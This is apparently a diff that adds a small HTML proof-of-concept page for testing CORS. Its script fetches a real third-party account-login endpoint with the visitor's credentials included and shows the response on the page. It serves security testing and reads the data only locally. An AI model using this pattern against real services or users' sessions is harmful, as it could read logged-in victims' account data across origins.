@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS Test</title>
+</head>
+<body>
+<h1>CORS PoC</h1>
+<pre id="output"></pre>
+ 
+    <script>
+
+    fetch("https://accounts.eu1.gigya.com/accounts.login", {
+
+        credentials: "include"
+
+    })
+
+    .then(r => r.text())
+
+    .then(data => {
+
+        document.getElementById("output").innerText = data;
+
+        console.log(data);
+
+    }) 
+
+    .catch(err => {
+
+        document.getElementById("output").innerText = err;
+
+    });
+</script>
+</body>
+</html>
+ 
+ 
